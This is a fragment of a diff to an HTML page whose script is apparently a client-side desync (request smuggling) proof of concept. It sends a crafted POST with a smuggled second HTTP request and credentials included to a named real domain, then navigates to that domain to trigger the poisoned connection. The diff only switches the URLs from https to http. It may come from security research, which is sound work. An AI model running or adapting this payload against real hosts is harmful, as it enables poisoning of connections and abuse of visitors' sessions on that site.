@@ -21,14 +21,14 @@
 
   <script>
     function runDesync() {
-      fetch("https://caasey.ey.com/robots.txt", {
+      fetch("http://caasey.ey.com/robots.txt", {
         method: "POST",
         body: `GET /404 HTTP/1.1\r\nfoo:barGET / HTTP/1.1\r\nHost: caasey.ey.com\r\n\r\n`,
         mode: "no-cors",
         credentials: "include"
       }).then(() => {
         // Reuse the same connection — if poisoned, this request will be affected
-        location.href = "https://caasey.ey.com/";
+        location.href = "http://caasey.ey.com/";
       });
     }
   </script>
